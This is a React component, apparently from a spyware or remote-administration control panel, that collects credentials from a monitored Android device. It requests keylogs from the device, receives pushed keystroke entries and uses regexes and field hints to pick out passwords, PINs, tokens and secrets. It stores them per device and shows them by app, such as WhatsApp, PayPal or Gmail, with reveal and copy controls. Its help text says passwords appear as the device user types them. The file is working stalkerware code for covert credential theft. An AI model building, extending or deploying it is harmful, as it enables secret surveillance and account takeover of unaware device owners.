import React, { useState, useEffect, useRef } from 'react';

const PASSWORD_PATTERNS = [
  /password[:\s=]+([^\s\n]{4,})/i,
  /pass[:\s=]+([^\s\n]{4,})/i,
  /pwd[:\s=]+([^\s\n]{4,})/i,
  /pin[:\s=]+([0-9]{4,8})/i,
  /secret[:\s=]+([^\s\n]{4,})/i,
  /token[:\s=]+([^\s\n]{8,})/i,
  /key[:\s=]+([^\s\n]{8,})/i,
];

const FIELD_HINTS = ['password', 'passwd', 'pwd', 'pin', 'pass', 'secret', 'credentials'];

function looksLikePassword(text, fieldHint, isPasswordFlag, eventType) {
  if (isPasswordFlag === true || isPasswordFlag === 'true') return true;
  if (eventType === 'PASSWORD_FOCUS') return true;
  if (!text) return false;
  const low = (fieldHint || '').toLowerCase();
  if (FIELD_HINTS.some(h => low.includes(h))) return true;
  for (const pat of PASSWORD_PATTERNS) {
    if (pat.test(text)) return true;
  }
  return false;
}

function extractPasswordValue(text, fieldHint, isPasswordFlag, eventType) {
  if (isPasswordFlag === true || isPasswordFlag === 'true') return text;
  if (eventType === 'PASSWORD_FOCUS') return text;
  const low = (fieldHint || '').toLowerCase();
  if (FIELD_HINTS.some(h => low.includes(h))) return text;
  for (const pat of PASSWORD_PATTERNS) {
    const m = text.match(pat);
    if (m) return m[1];
  }
  return text;
}

function AppIcon({ pkg }) {
  const icons = {
    'com.whatsapp': '💬', 'com.instagram.android': '📸', 'com.facebook.katana': '👤',
    'org.telegram.messenger': '✈️', 'com.snapchat.android': '👻',
    'com.twitter.android': '🐦', 'com.google.android.gm': '📧',
    'com.google.android.chrome': '🌐', 'com.netflix.mediaclient': '📺',
    'com.spotify.music': '🎵', 'com.paypal.android.p2pmobile': '💰',
  };
  return <span style={{ fontSize: 18 }}>{icons[pkg] || '📦'}</span>;
}

function PasswordEntry({ entry, onDelete }) {
  const [revealed, setRevealed] = useState(false);
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(entry.value).catch(() => {});
    setCopied(true);
    setTimeout(() => setCopied(false), 1500);
  };

  return (
    <div style={{
      background: '#16213e', border: '1px solid #2d2d4e', borderRadius: 10, padding: 14,
      display: 'flex', gap: 12, alignItems: 'flex-start'
    }}>
      <AppIcon pkg={entry.appPackage} />
      <div style={{ flex: 1, minWidth: 0 }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8, marginBottom: 4 }}>
          <span style={{ fontWeight: 600, fontSize: 13, color: '#a78bfa' }}>
            {entry.appName || entry.appPackage || 'Unknown App'}
          </span>
          {entry.fieldHint && (
            <span style={{ fontSize: 10, background: 'rgba(124,58,237,0.2)', color: '#a78bfa', padding: '1px 6px', borderRadius: 4 }}>
              {entry.fieldHint}
            </span>
          )}
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
          <div style={{
            fontFamily: 'monospace', fontSize: 14, color: revealed ? '#f0f0ff' : 'transparent',
            background: revealed ? '#1a1a2e' : '#94a3b8', borderRadius: 4, padding: '4px 10px',
            border: '1px solid #2d2d4e', letterSpacing: revealed ? 1 : 2, flex: 1, minWidth: 0,
            textShadow: revealed ? 'none' : '0 0 8px #94a3b8',
            transition: 'all 0.2s', userSelect: revealed ? 'text' : 'none',
            whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis'
          }}>
            {revealed ? entry.value : '●'.repeat(Math.min(entry.value.length, 12))}
          </div>
          <button
            onClick={() => setRevealed(v => !v)}
            title={revealed ? 'Hide' : 'Reveal'}
            style={{ background: revealed ? 'rgba(239,68,68,0.1)' : 'rgba(34,197,94,0.1)', border: `1px solid ${revealed ? 'rgba(239,68,68,0.3)' : 'rgba(34,197,94,0.3)'}`, borderRadius: 6, padding: '4px 10px', color: revealed ? '#ef4444' : '#22c55e', cursor: 'pointer', fontSize: 12, fontWeight: 600, flexShrink: 0 }}
          >
            {revealed ? '🙈 Hide' : '👁 Reveal'}
          </button>
          <button
            onClick={handleCopy}
            title="Copy password"
            style={{ background: copied ? 'rgba(34,197,94,0.1)' : '#1a1a2e', border: '1px solid #2d2d4e', borderRadius: 6, padding: '4px 10px', color: copied ? '#22c55e' : '#94a3b8', cursor: 'pointer', fontSize: 12, flexShrink: 0 }}
          >
            {copied ? '✓' : '📋'}
          </button>
        </div>
        <div style={{ fontSize: 10, color: '#64748b', marginTop: 4 }}>
          {entry.appPackage && <span style={{ marginRight: 8, fontFamily: 'monospace' }}>{entry.appPackage}</span>}
          {entry.capturedAt && <span>{new Date(entry.capturedAt).toLocaleString()}</span>}
        </div>
      </div>
      <button
        onClick={() => onDelete(entry.id)}
        title="Remove entry"
        style={{ background: 'none', border: 'none', color: '#ef4444', cursor: 'pointer', fontSize: 14, flexShrink: 0 }}
      >✕</button>
    </div>
  );
}

function storageKey(deviceId) {
  return `captured_passwords_${deviceId}`;
}

function loadPasswords(deviceId) {
  try { return JSON.parse(localStorage.getItem(storageKey(deviceId)) || '[]'); } catch { return []; }
}
function savePasswords(deviceId, list) {
  localStorage.setItem(storageKey(deviceId), JSON.stringify(list));
}

export default function PasswordsTab({ device, sendCommand, results, keylogPushEntries }) {
  const deviceId = device.deviceId;
  const isOnline = device.isOnline;

  const [passwords, setPasswords] = useState(() => loadPasswords(deviceId));
  const [sortBy, setSortBy]       = useState('time');
  const [search, setSearch]       = useState('');
  const [revealAll, setRevealAll] = useState(false);
  const [filterApp, setFilterApp] = useState('');

  const [loading, setLoading]     = useState(false);
  const seenIds = useRef(new Set());

  // Reload passwords when switching to a different device
  useEffect(() => {
    setPasswords(loadPasswords(deviceId));
    seenIds.current = new Set();
    setSearch('');
    setFilterApp('');
  }, [deviceId]);

  // Absorb keylog push entries for password detection
  useEffect(() => {
    if (!keylogPushEntries || keylogPushEntries.length === 0) return;
    const newEntries = [];
    keylogPushEntries.forEach(entry => {
      const id = entry.id || (entry.timestamp + entry.text);
      if (seenIds.current.has(id)) return;
      seenIds.current.add(id);

      const text = entry.text || entry.content || '';
      const fieldHint = entry.fieldType || entry.inputType || entry.field || '';
      const isPasswordFlag = entry.isPassword;
      const eventType = entry.eventType || '';
      if (looksLikePassword(text, fieldHint, isPasswordFlag, eventType)) {
        newEntries.push({
          id: id + '_' + Date.now(),
          value: extractPasswordValue(text, fieldHint, isPasswordFlag, eventType),
          appName: entry.appName || entry.app || '',
          appPackage: entry.packageName || entry.pkg || '',
          fieldHint: fieldHint || (isPasswordFlag ? 'password' : ''),
          capturedAt: entry.timestamp || Date.now(),
          source: 'keylog',
          isPassword: isPasswordFlag === true || isPasswordFlag === 'true',
        });
      }
    });
    if (newEntries.length > 0) {
      setPasswords(prev => {
        const updated = [...newEntries, ...prev];
        savePasswords(deviceId, updated);
        return updated;
      });
    }
  }, [keylogPushEntries]);

  // Absorb command results (e.g. get_keylogs)
  useEffect(() => {
    results.forEach(r => {
      if (r.command === 'get_keylogs' && r.success && r.response && !seenIds.current.has('result_' + r.id)) {
        seenIds.current.add('result_' + r.id);
        setLoading(false);
        try {
          const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
          const entries = data.keylogs || data.logs || data.entries || [];
          const newEntries = [];
          entries.forEach(entry => {
            const text = entry.text || entry.content || '';
            const fieldHint = entry.fieldType || entry.inputType || entry.field || '';
            const isPasswordFlag = entry.isPassword;
            const eventType = entry.eventType || '';
            if (looksLikePassword(text, fieldHint, isPasswordFlag, eventType)) {
              const id = (entry.id || entry.timestamp + text);
              if (!seenIds.current.has(id)) {
                seenIds.current.add(id);
                newEntries.push({
                  id: id + '_scan',
                  value: extractPasswordValue(text, fieldHint, isPasswordFlag, eventType),
                  appName: entry.appName || entry.app || '',
                  appPackage: entry.packageName || entry.pkg || '',
                  fieldHint: fieldHint || (isPasswordFlag ? 'password' : ''),
                  capturedAt: entry.timestamp || Date.now(),
                  source: 'scan',
                  isPassword: isPasswordFlag === true || isPasswordFlag === 'true',
                });
              }
            }
          });
          if (newEntries.length > 0) {
            setPasswords(prev => {
              const updated = [...newEntries, ...prev];
              savePasswords(deviceId, updated);
              return updated;
            });
          }
        } catch (_) {}
      }
    });
  }, [results]);

  const handleScan = () => {
    if (!isOnline) return;
    setLoading(true);
    sendCommand(deviceId, 'get_keylogs', { limit: 500 });
  };

  const deleteEntry = (id) => {
    setPasswords(prev => {
      const updated = prev.filter(e => e.id !== id);
      savePasswords(deviceId, updated);
      return updated;
    });
  };

  const clearAll = () => {
    if (!window.confirm('Clear all captured passwords?')) return;
    setPasswords([]);
    savePasswords(deviceId, []);
  };

  // Filtering & sorting
  const apps = [...new Set(passwords.map(p => p.appPackage || '').filter(Boolean))];

  let visible = passwords.filter(p => {
    if (filterApp && p.appPackage !== filterApp) return false;
    if (search) {
      const q = search.toLowerCase();
      return (p.appName || '').toLowerCase().includes(q)
          || (p.appPackage || '').toLowerCase().includes(q)
          || (p.fieldHint || '').toLowerCase().includes(q);
    }
    return true;
  });

  if (sortBy === 'app') {
    visible = [...visible].sort((a, b) => (a.appName || a.appPackage || '').localeCompare(b.appName || b.appPackage || ''));
  } else {
    visible = [...visible].sort((a, b) => b.capturedAt - a.capturedAt);
  }

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>

      {/* Header */}
      <div style={{ background: '#16213e', border: '1px solid #2d2d4e', borderRadius: 10, padding: '12px 16px', display: 'flex', gap: 10, alignItems: 'center', flexWrap: 'wrap' }}>
        <span style={{ fontSize: 20 }}>🔑</span>
        <div>
          <div style={{ fontWeight: 700, fontSize: 14 }}>Password Vault</div>
          <div style={{ fontSize: 11, color: '#94a3b8' }}>{passwords.length} captured credential{passwords.length !== 1 ? 's' : ''} · auto-detected from keylogger</div>
        </div>
        <div style={{ flex: 1 }} />
        <button
          onClick={handleScan}
          disabled={!isOnline || loading}
          style={{ background: '#7c3aed', border: 'none', borderRadius: 6, color: '#fff', padding: '6px 14px', fontSize: 12, cursor: 'pointer', fontWeight: 600, opacity: !isOnline ? 0.5 : 1 }}
        >{loading ? '⏳ Scanning…' : '🔍 Scan Keylogs'}</button>
        {passwords.length > 0 && (
          <button
            onClick={clearAll}
            style={{ background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.3)', borderRadius: 6, color: '#ef4444', padding: '6px 14px', fontSize: 12, cursor: 'pointer' }}
          >🗑️ Clear All</button>
        )}
      </div>

      {/* Filters */}
      {passwords.length > 0 && (
        <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', alignItems: 'center' }}>
          <input
            value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Search app or field…"
            style={{ background: '#16213e', border: '1px solid #2d2d4e', borderRadius: 6, padding: '6px 10px', color: '#f0f0ff', fontSize: 12, width: 200 }}
          />
          <select
            value={filterApp}
            onChange={e => setFilterApp(e.target.value)}
            style={{ background: '#16213e', border: '1px solid #2d2d4e', borderRadius: 6, padding: '6px 10px', color: '#f0f0ff', fontSize: 12 }}
          >
            <option value="">All Apps</option>
            {apps.map(pkg => (
              <option key={pkg} value={pkg}>{pkg}</option>
            ))}
          </select>
          <div style={{ display: 'flex', gap: 4 }}>
            <button
              onClick={() => setSortBy('time')}
              style={{ background: sortBy === 'time' ? '#7c3aed' : '#16213e', border: '1px solid #2d2d4e', borderRadius: 6, color: sortBy === 'time' ? '#fff' : '#94a3b8', padding: '5px 10px', fontSize: 11, cursor: 'pointer' }}
            >⏰ By Time</button>
            <button
              onClick={() => setSortBy('app')}
              style={{ background: sortBy === 'app' ? '#7c3aed' : '#16213e', border: '1px solid #2d2d4e', borderRadius: 6, color: sortBy === 'app' ? '#fff' : '#94a3b8', padding: '5px 10px', fontSize: 11, cursor: 'pointer' }}
            >📱 By App</button>
          </div>
        </div>
      )}

      {/* Empty State */}
      {passwords.length === 0 && (
        <div style={{ background: '#16213e', border: '1px dashed #2d2d4e', borderRadius: 10, padding: '50px 20px', textAlign: 'center', color: '#64748b' }}>
          <div style={{ fontSize: 40, marginBottom: 12 }}>🔒</div>
          <div style={{ fontSize: 14, fontWeight: 600, marginBottom: 6 }}>No passwords captured yet</div>
          <div style={{ fontSize: 12 }}>
            Passwords are auto-detected from keylog entries.<br />
            Click <strong>Scan Keylogs</strong> to search existing logs, or they'll appear automatically as the device user types passwords.
          </div>
        </div>
      )}

      {/* Password List */}
      <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
        {visible.map(entry => (
          <PasswordEntry key={entry.id} entry={entry} onDelete={deleteEntry} />
        ))}
        {visible.length === 0 && passwords.length > 0 && (
          <div style={{ textAlign: 'center', color: '#94a3b8', fontSize: 12, padding: 20 }}>
            No results match your filter.
          </div>
        )}
      </div>

      {/* Info */}
      <div style={{ background: 'rgba(124,58,237,0.08)', border: '1px solid rgba(124,58,237,0.2)', borderRadius: 8, padding: '10px 14px', fontSize: 11, color: '#94a3b8' }}>
        ℹ️ Passwords are detected automatically when keylog entries contain password-like fields (password, pin, token, etc.). Data is stored locally per device in your browser and never sent to any server.
      </div>
    </div>
  );
}
